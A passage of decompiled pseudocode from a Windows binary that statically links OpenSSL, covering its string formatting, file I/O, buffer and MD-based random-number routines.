            case 'E':
              LOBYTE(v10) = v10 | 0x20;
              goto LABEL_72;
            case 'G':
              LOBYTE(v10) = v10 | 0x20;
              goto LABEL_74;
            case 'X':
              LOBYTE(v10) = v10 | 0x20;
              goto LABEL_61;
            case 'c':
              v31 = *a7++;
              v32 = sub_417DE0(a1, a2, &v36, a3, v31);
LABEL_76:
              if ( !v32 )
                return 0;
              a6 = v42;
              goto LABEL_93;
            case 'd':
            case 'i':
              v18 = v8 - 1;
              if ( v18 )
              {
                if ( v18 == 3 )
                {
                  v19 = *(_QWORD *)a7;
                  a7 += 2;
                  goto LABEL_57;
                }
                LODWORD(v19) = *a7++;
              }
              else
              {
                LODWORD(v19) = *(__int16 *)a7++;
              }
              v19 = (int)v19;
LABEL_57:
              v20 = sub_418040(a2, &v36, a1, a3, v19, 0xAu, v40, v37, v10);
LABEL_58:
              if ( !v20 )
                return 0;
LABEL_93:
              v11 = *a6;
              v8 = 0;
              ++a6;
              v10 = 0;
              v39 = 0;
              v40 = 0;
              v38 = 0;
              v41 = 0;
              v37 = -1;
              break;
            case 'e':
LABEL_72:
              v27 = *(__int64 *)a7;
              a7 += 2;
              v28 = alloca(8);
              v20 = sub_418340(&v36, a3, a1, a2, *(double *)&v27, v40, v37, v10, 1);
              goto LABEL_58;
            case 'f':
              v25 = *(__int64 *)a7;
              a7 += 2;
              v26 = alloca(8);
              v20 = sub_418340(&v36, a3, a1, a2, *(double *)&v25, v40, v37, v10, 0);
              goto LABEL_58;
            case 'g':
LABEL_74:
              v29 = *(__int64 *)a7;
              a7 += 2;
              v30 = alloca(8);
              v20 = sub_418340(&v36, a3, a1, a2, *(double *)&v29, v40, v37, v10, 2);
              goto LABEL_58;
            case 'n':
              ++a7;
              switch ( v8 )
              {
                case 1:
                  *(_WORD *)*(a7 - 1) = v36;
                  break;
                case 2:
                  *(_DWORD *)*(a7 - 1) = v36;
                  break;
                case 4:
                  v35 = (_DWORD *)*(a7 - 1);
                  *v35 = v36;
                  v35[1] = 0;
                  break;
                default:
                  *(_DWORD *)*(a7 - 1) = v36;
                  break;
              }
              goto LABEL_93;
            case 'o':
            case 'u':
            case 'x':
LABEL_61:
              v21 = v10 | 0x40;
              v22 = v8 - 1;
              if ( v22 )
              {
                if ( v22 == 3 )
                {
                  v23 = *(_QWORD *)a7;
                  a7 += 2;
                }
                else
                {
                  LODWORD(v23) = *a7++;
                  v23 = (unsigned int)v23;
                }
              }
              else
              {
                LODWORD(v23) = *(unsigned __int16 *)a7++;
                v23 = (int)v23;
              }
              if ( v11 == 111 )
                v24 = 8;
              else
                v24 = v11 != 117 ? 16 : 10;
              v20 = sub_418040(a2, &v36, a1, a3, v23, v24, v40, v37, v21);
              goto LABEL_58;
            case 'p':
              v34 = *a7++;
              v20 = sub_418040(a2, &v36, a1, a3, v34, 0x10u, v40, v37, v10 | 8);
              goto LABEL_58;
            case 's':
              v33 = (char *)*a7++;
              if ( v37 < 0 )
              {
                if ( a2 )
                  v37 = 0x7FFFFFFF;
                else
                  v37 = *a3;
              }
              v20 = sub_417EE0(v40, a1, a2, &v36, a3, v33, v10, v37);
              goto LABEL_58;
            case 'w':
              ++a6;
              goto LABEL_93;
            default:
              goto LABEL_93;
          }
          goto LABEL_4;
        default:
          goto LABEL_13;
      }
    }
    break;
  }
  if ( !a2 )
  {
    v12 = *a3 - 1 >= v36;
    *a5 = *a3 - 1 < v36;
    if ( !v12 )
      v36 = *a3 - 1;
  }
  if ( !sub_417DE0(a1, a2, &v36, a3, 0) )
    return 0;
  *a4 = v36 - 1;
  return 1;
}

//----- (00419090) --------------------------------------------------------
int __cdecl sub_419090(int a1, char *a2, int *a3)
{
  void *v4; // esi
  int v5; // edi
  void *Block; // [esp+4h] [ebp-818h] BYREF
  int v7; // [esp+8h] [ebp-814h] BYREF
  unsigned int v8; // [esp+Ch] [ebp-810h] BYREF
  char *v9; // [esp+10h] [ebp-80Ch] BYREF
  int v10; // [esp+14h] [ebp-808h] BYREF
  char v11[2048]; // [esp+18h] [ebp-804h] BYREF

  v9 = v11;
  v8 = 2048;
  Block = 0;
  if ( sub_418A30((const void **)&v9, &Block, &v8, &v7, &v10, a2, a3) )
  {
    v4 = Block;
    if ( !Block )
      return sub_405110(a1, (int)v11, v7);
    v5 = sub_405110(a1, (int)Block, v7);
    sub_413490(v4);
    return v5;
  }
  else
  {
    sub_413490(Block);
    return -1;
  }
}

//----- (00419190) --------------------------------------------------------
int sub_419190(int a1, char *a2, ...)
{
  va_list va; // [esp+Ch] [ebp+Ch] BYREF

  va_start(va, a2);
  return sub_419090(a1, a2, (int *)va);
}

//----- (004191B0) --------------------------------------------------------
unsigned int __cdecl sub_4191B0(int a1, int a2, char *a3, int a4)
{
  unsigned int result; // eax
  int v5; // [esp+0h] [ebp-8h] BYREF
  unsigned int v6; // [esp+4h] [ebp-4h] BYREF

  if ( !sub_418A30((const void **)&a1, 0, (unsigned int *)&a2, &v6, &v5, a3, &a4) )
    return -1;
  if ( v5 )
    return -1;
  result = v6;
  if ( v6 > 0x7FFFFFFF )
    return -1;
  return result;
}

//----- (00419210) --------------------------------------------------------
int __cdecl sub_419210(int a1)
{
  if ( !a1 )
    return 0;
  if ( *(_DWORD *)(a1 + 16) )
  {
    if ( *(_DWORD *)(a1 + 12) )
    {
      if ( *(_DWORD *)(a1 + 32) )
      {
        fclose(*(FILE **)(a1 + 32));
        *(_DWORD *)(a1 + 32) = 0;
        *(_DWORD *)(a1 + 20) = 0;
      }
    }
    *(_DWORD *)(a1 + 12) = 0;
  }
  return 1;
}

//----- (00419260) --------------------------------------------------------
size_t __cdecl sub_419260(int a1, void *Buffer, size_t ElementCount)
{
  size_t result; // eax
  size_t v4; // edi
  __int16 LastError; // ax

  result = 0;
  if ( *(_DWORD *)(a1 + 12) && Buffer )
  {
    v4 = fread(Buffer, 1u, ElementCount, *(FILE **)(a1 + 32));
    if ( ferror(*(FILE **)(a1 + 32)) )
    {
      LastError = GetLastError();
      sub_408310(2, 11, LastError, (int)"crypto\\bio\\bss_file.c", 150);
      sub_408310(32, 130, 2, (int)"crypto\\bio\\bss_file.c", 151);
      return -1;
    }
    else
    {
      return v4;
    }
  }
  return result;
}

//----- (004192E0) --------------------------------------------------------
size_t __cdecl sub_4192E0(int a1, void *Buffer, size_t ElementSize)
{
  size_t result; // eax

  result = 0;
  if ( *(_DWORD *)(a1 + 12) && Buffer )
  {
    result = fwrite(Buffer, ElementSize, 1u, *(FILE **)(a1 + 32));
    if ( result )
      return ElementSize;
  }
  return result;
}

//----- (00419310) --------------------------------------------------------
int __cdecl sub_419310(int a1, int a2, int Offset, FILE *Stream)
{
  _DWORD *v4; // esi
  FILE *v5; // eax
  int v6; // ebp
  char v8; // bl
  int v9; // eax
  char v10; // bl
  _WORD *v11; // edi
  char v12; // al
  char v13; // al
  FILE *v14; // edi
  FILE *v15; // eax
  __int16 LastError; // ax
  FILE *v17; // [esp-8h] [ebp-18h]
  const char *v18; // [esp-8h] [ebp-18h]
  void *retaddr; // [esp+10h] [ebp+0h] BYREF

  v4 = (_DWORD *)a1;
  v5 = *(FILE **)(a1 + 32);
  v6 = 1;
  switch ( a2 )
  {
    case 1:
    case 128:
      return fseek(v5, Offset, 0);
    case 2:
      return feof(*(FILE **)(a1 + 32));
    case 3:
    case 133:
      return ftell(*(FILE **)(a1 + 32));
    case 8:
      return *(_DWORD *)(a1 + 16);
    case 9:
      *(_DWORD *)(a1 + 16) = Offset;
      return 1;
    case 11:
      fflush(*(FILE **)(a1 + 32));
      return 1;
    case 12:
      return v6;
    case 106:
      sub_419210(a1);
      v8 = Offset;
      v4[4] = Offset & 1;
      v17 = Stream;
      v4[8] = Stream;
      v4[3] = 1;
      v9 = _fileno_0(v17);
      if ( (v8 & 0x10) != 0 )
        _setmode(v9, 0x4000);
      else
        _setmode(v9, 0x8000);
      return 1;
    case 107:
      if ( !Stream )
        return v6;
      Stream->_ptr = (char *)v5;
      return 1;
    case 108:
      sub_419210(a1);
      v10 = Offset;
      v4[4] = Offset & 1;
      if ( (v10 & 8) != 0 )
      {
        if ( (v10 & 2) != 0 )
        {
          sub_424880((char *)&a1, "a+", 4u);
          goto LABEL_21;
        }
        v18 = (const char *)&unk_4F1D6C;
      }
      else
      {
        if ( (v10 & 2) != 0 )
        {
          if ( (v10 & 4) != 0 )
          {
            sub_424880((char *)&a1, "r+", 4u);
            goto LABEL_21;
          }
        }
        else if ( (v10 & 4) != 0 )
        {
          sub_424880((char *)&a1, "w", 4u);
          goto LABEL_21;
        }
        if ( (v10 & 2) == 0 )
        {
          sub_408310(32, 116, 101, (int)"crypto\\bio\\bss_file.c", 275);
          return 0;
        }
        v18 = "r";
      }
      sub_424880((char *)&a1, v18, 4u);
LABEL_21:
      v11 = (_WORD *)((char *)&retaddr + 3);
      if ( (v10 & 0x10) != 0 )
      {
        do
        {
          v13 = *((_BYTE *)v11 + 1);
          v11 = (_WORD *)((char *)v11 + 1);
        }
        while ( v13 );
        *v11 = 116;
      }
      else
      {
        do
        {
          v12 = *((_BYTE *)v11 + 1);
          v11 = (_WORD *)((char *)v11 + 1);
        }
        while ( v12 );
        *v11 = 98;
      }
      v14 = Stream;
      v15 = sub_42B600((LPCCH)Stream, (const CHAR *)&a1);
      if ( v15 )
      {
        v4[8] = v15;
        v4[3] = 1;
        sub_405010((int)v4, 0);
        return 1;
      }
      else
      {
        LastError = GetLastError();
        sub_408310(2, 1, LastError, (int)"crypto\\bio\\bss_file.c", 287);
        sub_408610(5, "fopen('", v14, "','", &a1, "')");
        sub_408310(32, 116, 2, (int)"crypto\\bio\\bss_file.c", 289);
        return 0;
      }
    default:
      return 0;
  }
}

//----- (00419610) --------------------------------------------------------
unsigned int __cdecl sub_419610(int a1, char *Buffer, int MaxCount)
{
  *Buffer = 0;
  if ( fgets(Buffer, MaxCount, *(FILE **)(a1 + 32)) && *Buffer )
    return strlen(Buffer);
  else
    return 0;
}

//----- (00419660) --------------------------------------------------------
size_t __cdecl sub_419660(int a1, const char *Buffer)
{
  size_t v2; // esi
  size_t result; // eax

  v2 = strlen(Buffer);
  result = 0;
  if ( *(_DWORD *)(a1 + 12) && Buffer )
  {
    result = fwrite(Buffer, v2, 1u, *(FILE **)(a1 + 32));
    if ( result )
      return v2;
  }
  return result;
}

//----- (004196B0) --------------------------------------------------------
_DWORD *__cdecl sub_4196B0(LPCCH lpMultiByteStr, char *Str)
{
  FILE *v2; // edi
  int v3; // ebp
  __int16 LastError; // ax
  int v6; // eax
  _DWORD *v7; // esi

  v2 = sub_42B600(lpMultiByteStr, Str);
  v3 = 1;
  if ( !strchr(Str, 98) )
    v3 = 17;
  if ( v2 )
  {
    v6 = sub_404E70((int)&unk_4F1D08);
    v7 = (_DWORD *)v6;
    if ( v6 )
    {
      sub_405010(v6, 0);
      sub_405390(v7, 106, v3, (int)v2);
      return v7;
    }
    else
    {
      fclose(v2);
      return 0;
    }
  }
  else
  {
    LastError = GetLastError();
    sub_408310(2, 1, LastError, (int)"crypto\\bio\\bss_file.c", 74);
    sub_408610(5, "fopen('", lpMultiByteStr, "','", Str, "')");
    if ( *_errno() == 2 )
      sub_408310(32, 109, 128, (int)"crypto\\bio\\bss_file.c", 77);
    else
      sub_408310(32, 109, 2, (int)"crypto\\bio\\bss_file.c", 79);
    return 0;
  }
}

//----- (004197A0) --------------------------------------------------------
int __cdecl sub_4197A0(int a1, int a2)
{
  int result; // eax
  _DWORD *v3; // esi

  result = sub_404E70((int)&unk_4F1D08);
  v3 = (_DWORD *)result;
  if ( result )
  {
    sub_405030(result, 0);
    sub_405390(v3, 106, a2, a1);
    return (int)v3;
  }
  return result;
}

//----- (004197E0) --------------------------------------------------------
void *sub_4197E0()
{
  void *result; // eax

  result = sub_413430(0x10u);
  if ( !result )
  {
    sub_408310(7, 101, 65, (int)"crypto\\buffer\\buffer.c", 37);
    return 0;
  }
  return result;
}

//----- (00419810) --------------------------------------------------------
void __cdecl sub_419810(_DWORD *Block)
{
  _BYTE *v1; // eax

  if ( Block )
  {
    v1 = (_BYTE *)Block[1];
    if ( v1 )
    {
      if ( (Block[3] & 1) != 0 )
      {
        sub_42AC10(v1);
        sub_413490(Block);
        return;
      }
      sub_4134B0(v1, Block[2]);
    }
    sub_413490(Block);
  }
}

//----- (00419870) --------------------------------------------------------
void *__usercall sub_419870@<eax>(int a1@<edi>, size_t Size)
{
  void *v2; // esi
  const void *v3; // eax

  v2 = (void *)sub_42ABD0(Size);
  v3 = *(const void **)(a1 + 4);
  if ( v3 )
  {
    if ( v2 )
      memcpy(v2, v3, *(_DWORD *)a1);
    sub_42AC10(*(void **)(a1 + 4));
  }
  return v2;
}

//----- (004198C0) --------------------------------------------------------
unsigned int __cdecl sub_4198C0(int a1, unsigned int a2)
{
  int v2; // ecx
  char *v4; // eax
  char *v5; // [esp-10h] [ebp-18h]
  size_t v6; // [esp-8h] [ebp-10h]

  if ( *(_DWORD *)a1 >= a2 )
    goto LABEL_5;
  if ( *(_DWORD *)(a1 + 8) >= a2 )
  {
    v2 = *(_DWORD *)(a1 + 4);
    if ( v2 )
      memset((void *)(*(_DWORD *)a1 + v2), 0, a2 - *(_DWORD *)a1);
LABEL_5:
    *(_DWORD *)a1 = a2;
    return a2;
  }
  if ( a2 <= 0x5FFFFFFC )
  {
    if ( (*(_BYTE *)(a1 + 12) & 1) != 0 )
      v4 = (char *)sub_419870(a1, 4 * ((a2 + 3) / 3));
    else
      v4 = (char *)sub_413500(*(void **)(a1 + 4), 4 * ((a2 + 3) / 3), (int)"crypto\\buffer\\buffer.c", 96);
    if ( v4 )
    {
      v6 = a2 - *(_DWORD *)a1;
      v5 = &v4[*(_DWORD *)a1];
      *(_DWORD *)(a1 + 4) = v4;
      *(_DWORD *)(a1 + 8) = 4 * ((a2 + 3) / 3);
      memset(v5, 0, v6);
      *(_DWORD *)a1 = a2;
      return a2;
    }
    else
    {
      sub_408310(7, 100, 65, (int)"crypto\\buffer\\buffer.c", 98);
      return 0;
    }
  }
  else
  {
    sub_408310(7, 100, 65, (int)"crypto\\buffer\\buffer.c", 89);
    return 0;
  }
}

//----- (004199A0) --------------------------------------------------------
unsigned int __cdecl sub_4199A0(int a1, unsigned int a2)
{
  int v2; // eax
  int v3; // ecx
  size_t v5; // ecx
  char *v6; // eax
  char *v7; // [esp-10h] [ebp-18h]
  size_t v8; // [esp-8h] [ebp-10h]

  v2 = *(_DWORD *)a1;
  if ( *(_DWORD *)a1 < a2 )
  {
    v5 = *(_DWORD *)(a1 + 8);
    if ( v5 < a2 )
    {
      if ( a2 <= 0x5FFFFFFC )
      {
        if ( (*(_BYTE *)(a1 + 12) & 1) != 0 )
          v6 = (char *)sub_419870(a1, 4 * ((a2 + 3) / 3));
        else
          v6 = sub_4135B0(*(_BYTE **)(a1 + 4), v5, 4 * ((a2 + 3) / 3));
        if ( v6 )
        {
          v8 = a2 - *(_DWORD *)a1;
          v7 = &v6[*(_DWORD *)a1];
          *(_DWORD *)(a1 + 4) = v6;
          *(_DWORD *)(a1 + 8) = 4 * ((a2 + 3) / 3);
          memset(v7, 0, v8);
          *(_DWORD *)a1 = a2;
          return a2;
        }
        else
        {
          sub_408310(7, 105, 65, (int)"crypto\\buffer\\buffer.c", 136);
          return 0;
        }
      }
      else
      {
        sub_408310(7, 105, 65, (int)"crypto\\buffer\\buffer.c", 127);
        return 0;
      }
    }
    else
    {
      memset((void *)(v2 + *(_DWORD *)(a1 + 4)), 0, a2 - v2);
      *(_DWORD *)a1 = a2;
      return a2;
    }
  }
  else
  {
    v3 = *(_DWORD *)(a1 + 4);
    if ( v3 )
      memset((void *)(a2 + v3), 0, v2 - a2);
    *(_DWORD *)a1 = a2;
    return a2;
  }
}

//----- (00419AA0) --------------------------------------------------------
char *__cdecl sub_419AA0(char *a1, char *a2, unsigned int a3)
{
  char *v3; // ecx
  char *result; // eax
  unsigned int v5; // esi
  char *v6; // ecx
  unsigned int v7; // esi
  char v8; // dl

  v3 = a2;
  if ( a2 )
  {
    result = &a1[a3 - 1];
    if ( a3 )
    {
      v5 = a3;
      do
      {
        *result-- = *v3++;
        --v5;
      }
      while ( v5 );
    }
  }
  else
  {
    v6 = a1;
    result = &a1[a3 - 1];
    if ( a3 >> 1 )
    {
      v7 = a3 >> 1;
      do
      {
        v8 = *result;
        *result = *v6;
        *v6 = v8;
        --result;
        ++v6;
        --v7;
      }
      while ( v7 );
    }
  }
  return result;
}

//----- (00419B00) --------------------------------------------------------
_DWORD *__cdecl sub_419B00(int a1)
{
  _DWORD *result; // eax

  result = sub_413430(0x10u);
  if ( result )
  {
    result[3] = a1;
  }
  else
  {
    sub_408310(7, 101, 65, (int)"crypto\\buffer\\buffer.c", 37);
    return 0;
  }
  return result;
}

//----- (00419B40) --------------------------------------------------------
void **sub_419B40()
{
  return &off_5312E4;
}
// 5312E4: using guessed type void *off_5312E4;

//----- (00419B50) --------------------------------------------------------
void sub_419B50()
{
  sub_4139E0(byte_538B30, 0x413u);
  dword_538F44 = 0;
  dword_538F48 = 0;
  sub_4139E0(&dword_538B1C, 0x14u);
  dbl_538F58 = 0.0;
  dword_538F4C = 0;
  dword_538F50 = 0;
  dword_538F54 = 0;
  sub_4146D0(dword_538F60);
  sub_4146D0(dword_538F64);
}
// 538B1C: using guessed type int dword_538B1C;
// 538F44: using guessed type int dword_538F44;
// 538F48: using guessed type int dword_538F48;
// 538F4C: using guessed type int dword_538F4C;
// 538F50: using guessed type int dword_538F50;
// 538F54: using guessed type int dword_538F54;
// 538F58: using guessed type double dbl_538F58;

//----- (00419BB0) --------------------------------------------------------
int __usercall sub_419BB0@<eax>(int a1@<edi>)
{
  int v2; // esi

  if ( (dword_73C6D4 & 0x40000000) == 0 )
    return 1;
  v2 = 0;
  while ( 1 )
  {
    if ( !sub_413B90() )
      return 1;
    if ( !sub_42BA10(a1) )
      break;
    if ( ++v2 >= 4 )
      return 1;
  }
  return 0;
}
// 73C6D4: using guessed type int dword_73C6D4;

//----- (00419C10) --------------------------------------------------------
struct _RTL_CRITICAL_SECTION *sub_419C10()
{
  struct _RTL_CRITICAL_SECTION *result; // eax

  dword_538F60 = sub_414650();
  result = sub_414650();
  dword_538F64 = result;
  if ( !dword_538F60 || (dword_538F70 = 1, !result) )
    dword_538F70 = 0;
  return result;
}
// 538F70: using guessed type int dword_538F70;

//----- (00419C50) --------------------------------------------------------
int __cdecl sub_419C50(int a1, int a2, double a3)
{
  int v3; // edi
  _BYTE **v5; // ebp
  int CurrentThreadId; // esi
  BOOL v7; // ebx
  int v8; // esi
  unsigned int v9; // ecx
  int *v10; // eax
  int k; // eax
  int i; // eax
  char v13; // cl
  char v14; // cl
  int j; // [esp+8h] [ebp-34h]
  BOOL v17; // [esp+10h] [ebp-2Ch]
  int v18; // [esp+14h] [ebp-28h]
  int v19; // [esp+18h] [ebp-24h]
  int v20; // [esp+20h] [ebp-1Ch]
  int v21; // [esp+24h] [ebp-18h] BYREF
  int v22[4]; // [esp+28h] [ebp-14h]

  v3 = a2;
  v19 = 0;
  if ( !a2 )
    return 1;
  v5 = (_BYTE **)sub_42B820();
  if ( v5 && (sub_414700(&dword_538F68, (void (*)(void))sub_419C10) ? dword_538F70 : 0) != 0 )
  {
    if ( dword_538F6C )
    {
      CurrentThreadId = GetCurrentThreadId();
      sub_414690(dword_538F64);
      v7 = sub_4147D0(dword_538B18, CurrentThreadId);
      v17 = v7;
      sub_4146B0(dword_538F64);
      if ( v7 )
        goto LABEL_8;
    }
    else
    {
      v17 = 0;
      v7 = 0;
    }
    sub_414690(dword_538F60);
LABEL_8:
    v20 = dword_538F50;
    v21 = dword_538B1C;
    v8 = dword_538F48;
    v9 = a2 + dword_538F48;
    v22[0] = dword_538B20;
    v22[1] = dword_538B24;
    v22[2] = dword_538B28;
    v22[3] = dword_538B2C;
    dword_538F48 = v9;
    if ( v9 < 0x3FF )
    {
      if ( (unsigned int)dword_538F44 < 0x3FF && v9 > dword_538F44 )
        dword_538F44 = v9;
    }
    else
    {
      dword_538F48 = -1023
                   * ((unsigned int)(((v9 * (unsigned __int64)(unsigned int)&loc_401005) >> 32)
                                   + ((unsigned int)(v9 - ((v9 * (unsigned __int64)(unsigned int)&loc_401005) >> 32)) >> 1)) >> 9)
                   + v9;
      dword_538F44 = 1023;
    }
    dword_538F50 += a2 / 20 + (a2 % 20 > 0);
    if ( !v7 )
      sub_4146B0(dword_538F60);
    v18 = 0;
    if ( a2 <= 0 )
    {
LABEL_35:
      if ( !v7 )
        sub_414690(dword_538F60);
      for ( i = 0; i < 20; i += 5 )
      {
        *((_BYTE *)&dword_538B1C + i) ^= *((_BYTE *)&v22[-1] + i);
        v13 = *((_BYTE *)&v21 + i + 2);
        *((_BYTE *)&dword_538B1C + i + 1) ^= *((_BYTE *)&v21 + i + 1);
        *((_BYTE *)&dword_538B1C + i + 2) ^= v13;
        v14 = *((_BYTE *)v22 + i);
        *((_BYTE *)&dword_538B1C + i + 3) ^= *((_BYTE *)&v21 + i + 3);
        *((_BYTE *)&dword_538B20 + i) ^= v14;
      }
      if ( dbl_538F58 < 32.0 )
        dbl_538F58 = dbl_538F58 + a3;
      if ( !v7 )
        sub_4146B0(dword_538F60);
      v19 = 1;
    }
    else
    {
      for ( j = a2; ; v3 = j )
      {
        if ( v3 > 20 )
          v3 = 20;
        v10 = (int *)sub_42BEA0();
        if ( !sub_42B860((int)v5, v10, 0) || !sub_42BA10((int)v5) || v3 + v8 - 1023 > 0 && !sub_42BA10((int)v5) )
          break;
        if ( !sub_42BA10((int)v5) || !sub_42BA10((int)v5) || !sub_42BA10((int)v5) || !sub_42BA20(v5, (int)&v21, 0) )
          break;
        ++v20;
        a1 += v3;
        for ( k = 0; k < v3; ++k )
        {
          byte_538B30[v8] ^= *((_BYTE *)&v22[-1] + k);
          if ( ++v8 >= 1023 )
            v8 = 0;
        }
        j -= 20;
        v18 += 20;
        if ( v18 >= a2 )
        {
          v7 = v17;
          goto LABEL_35;
        }
      }
    }
  }
  sub_42B840(v5);
  return v19;
}
// 538B18: using guessed type int dword_538B18;
// 538B1C: using guessed type int dword_538B1C;
// 538B20: using guessed type int dword_538B20;
// 538B24: using guessed type int dword_538B24;
// 538B28: using guessed type int dword_538B28;
// 538B2C: using guessed type int dword_538B2C;
// 538F44: using guessed type int dword_538F44;
// 538F48: using guessed type int dword_538F48;
// 538F4C: using guessed type int dword_538F4C;
// 538F50: using guessed type int dword_538F50;
// 538F58: using guessed type double dbl_538F58;
// 538F6C: using guessed type int dword_538F6C;
// 538F70: using guessed type int dword_538F70;

//----- (0041A010) --------------------------------------------------------
int __cdecl sub_41A010(int a1, int a2)
{
  _BYTE *v2; // ecx
  _BYTE *v3; // edi
  int v4; // esi
  _BYTE *v6; // ebp
  double v7; // st7
  int v8; // esi
  void *v9; // esp
  unsigned int v10; // esi
  unsigned int v11; // eax
  unsigned int v12; // ebp
  int *v13; // eax
  _BYTE *v14; // ebx
  int v15; // edx
  int i; // eax
  unsigned int v17; // esi
  unsigned int v18; // esi
  unsigned int v19; // esi
  unsigned int v20; // esi
  int *v21; // eax
  _BYTE **Block; // [esp+18h] [ebp-40h]
  int v23; // [esp+1Ch] [ebp-3Ch]
  int v24; // [esp+20h] [ebp-38h]
  __time64_t v25; // [esp+24h] [ebp-34h]
  _BYTE *v26; // [esp+2Ch] [ebp-2Ch]
  struct _FILETIME SystemTimeAsFileTime; // [esp+38h] [ebp-20h] BYREF
  int v28; // [esp+40h] [ebp-18h] BYREF
  int v29; // [esp+44h] [ebp-14h]
  int v30; // [esp+48h] [ebp-10h]
  int v31[2]; // [esp+4Ch] [ebp-Ch]

  v3 = v2;
  v26 = v2;
  v25 = _time64(0);
  v4 = 0;
  GetSystemTimeAsFileTime(&SystemTimeAsFileTime);
  if ( a1 <= 0 )
    return 1;
  v6 = sub_42B820();
  Block = (_BYTE **)v6;
  if ( v6 && (sub_414700(&dword_538F68, (void (*)(void))sub_419C10) ? dword_538F70 : 0) != 0 )
  {
    sub_414690(dword_538F60);
    sub_42C1A0();
    sub_414690(dword_538F64);
    dword_538B18 = GetCurrentThreadId();
    sub_4146B0(dword_538F64);
    dword_538F6C = 1;
    if ( !dword_538F54 )
    {
      sub_42C290();
      dword_538F54 = 1;
    }
    if ( !dword_538F74 )
      v4 = 1;
    if ( dbl_538F58 < 32.0 )
    {
      v24 = 0;
      v7 = 0.0;
      dbl_538F58 = dbl_538F58 - (double)a1;
      if ( dbl_538F58 < 0.0 )
        dbl_538F58 = 0.0;
    }
    else
    {
      v7 = 0.0;
      v24 = 1;
    }
    if ( v4 )
    {
      v8 = 52;
      while ( 1 )
      {
        v9 = alloca(8);
        sub_419C50((int)"....................", 20, v7);
        if ( !--v8 )
          break;
        v7 = 0.0;
      }
      if ( v24 )
        dword_538F74 = 1;
    }
    v28 = dword_538B1C;
    v29 = dword_538B20;
    v30 = dword_538B24;
    v10 = dword_538F48;
    v11 = 10 * ((a1 - 1) / 10 + 1) + dword_538F48;
    v31[0] = dword_538B28;
    v12 = dword_538F44;
    v31[1] = dword_538B2C;
    dword_538F48 = v11;
    if ( v11 > dword_538F44 )
      dword_538F48 = v11 % dword_538F44;
    ++dword_538F4C;
    dword_538F6C = 0;
    sub_42C1D0();
    sub_4146B0(dword_538F60);
    do
    {
      v23 = 10;
      if ( a1 < 10 )
        v23 = a1;
      a1 -= v23;
      v13 = (int *)sub_42BEA0();
      v14 = Block;
      if ( !sub_42B860((int)Block, v13, 0) )
        goto LABEL_71;
      if ( v25 )
      {
        if ( !sub_42BA10((int)Block) )
          goto LABEL_71;
        if ( !sub_42BA10((int)Block) )
          goto LABEL_71;
        v25 = 0i64;
        if ( !sub_419BB0((int)Block) )
          goto LABEL_71;
        v3 = v26;
      }
      if ( !sub_42BA10((int)Block) || !sub_42BA10((int)Block) )
        goto LABEL_71;
      if ( (int)(v10 - v12 + 10) > 0 && !sub_42BA10((int)Block)
        || !sub_42BA10((int)Block)
        || !sub_42BA20(Block, (int)&v28, 0) )
      {
        goto LABEL_70;
      }
      v15 = 0;
      for ( i = 2; i < 12; i += 5 )
      {
        byte_538B30[v10] ^= *((_BYTE *)&v28 + v15);
        v17 = v10 + 1;
        if ( v17 >= v12 )
          v17 = 0;
        if ( v15 < v23 )
          *v3++ = *((_BYTE *)&v30 + v15 + 2);
        byte_538B30[v17] ^= *((_BYTE *)&v28 + v15 + 1);
        v18 = v17 + 1;
        if ( v18 >= v12 )
          v18 = 0;
        if ( i - 1 < v23 )
          *v3++ = *((_BYTE *)&v30 + v15 + 3);
        byte_538B30[v18] ^= *((_BYTE *)&v28 + v15 + 2);
        v19 = v18 + 1;
        if ( v19 >= v12 )
          v19 = 0;
        if ( i < v23 )
          *v3++ = *((_BYTE *)v31 + v15);
        byte_538B30[v19] ^= *((_BYTE *)&v28 + v15 + 3);
        v20 = v19 + 1;
        if ( v20 >= v12 )
          v20 = 0;
        if ( i + 1 < v23 )
          *v3++ = *((_BYTE *)v31 + v15 + 1);
        byte_538B30[v20] ^= *((_BYTE *)&v29 + v15);
        v10 = v20 + 1;
        if ( v10 >= v12 )
          v10 = 0;
        if ( i + 2 < v23 )
          *v3++ = *((_BYTE *)v31 + v15 + 2);
        v15 += 5;
      }
      v26 = v3;
    }
    while ( a1 > 0 );
    v21 = (int *)sub_42BEA0();
    if ( sub_42B860((int)Block, v21, 0) && sub_42BA10((int)Block) && sub_42BA10((int)Block) )
    {
      sub_414690(dword_538F60);
      sub_42C1A0();
      if ( sub_42BA10((int)Block) && sub_42BA20(Block, (int)&dword_538B1C, 0) )
      {
        sub_42C1D0();
        sub_4146B0(dword_538F60);
        sub_42B840(Block);
        if ( v24 )
          return 1;
        if ( !a2 )
        {
          sub_408310(36, 100, 100, (int)"crypto\\rand\\md_rand.c", 506);
          sub_408610(1, "You need to read the OpenSSL FAQ, https://www.openssl.org/docs/faq.html");
          return 0;
        }
        return 0;
      }
      sub_4146B0(dword_538F60);
      v14 = Block;
    }
    else
    {
LABEL_70:
      v14 = Block;
    }
LABEL_71:
    sub_408310(36, 100, 6, (int)"crypto\\rand\\md_rand.c", 512);
    sub_42B840(v14);
    return 0;
  }
  sub_408310(36, 100, 65, (int)"crypto\\rand\\md_rand.c", 516);
  sub_42B840(v6);
  return 0;
}
// 41A028: variable 'v2' is possibly undefined
// 538B18: using guessed type int dword_538B18;
// 538B1C: using guessed type int dword_538B1C;
// 538B20: using guessed type int dword_538B20;
// 538B24: using guessed type int dword_538B24;
// 538B28: using guessed type int dword_538B28;
// 538B2C: using guessed type int dword_538B2C;
// 538F44: using guessed type int dword_538F44;
// 538F48: using guessed type int dword_538F48;
// 538F4C: using guessed type int dword_538F4C;
// 538F50: using guessed type int dword_538F50;
// 538F54: using guessed type int dword_538F54;
// 538F58: using guessed type double dbl_538F58;
// 538F6C: using guessed type int dword_538F6C;
// 538F70: using guessed type int dword_538F70;
// 538F74: using guessed type int dword_538F74;

//----- (0041A590) --------------------------------------------------------
int __cdecl sub_41A590(int a1, int a2)
{
  return sub_41A010(a2, 0);
}

//----- (0041A5B0) --------------------------------------------------------
int __cdecl sub_41A5B0(int a1, int a2)
{
  return sub_41A010(a2, 1);
}

//----- (0041A5D0) --------------------------------------------------------
BOOL sub_41A5D0()
{
  int CurrentThreadId; // esi
  BOOL v2; // edi
  BOOL v3; // esi

  if ( (sub_414700(&dword_538F68, (void (*)(void))sub_419C10) ? dword_538F70 : 0) == 0 )
    return 0;
  CurrentThreadId = GetCurrentThreadId();
  if ( !dword_538F6C )
  {
    v2 = 0;
    goto LABEL_5;
  }
  sub_414690(dword_538F64);
  v2 = sub_4147D0(dword_538B18, CurrentThreadId);
  sub_4146B0(dword_538F64);
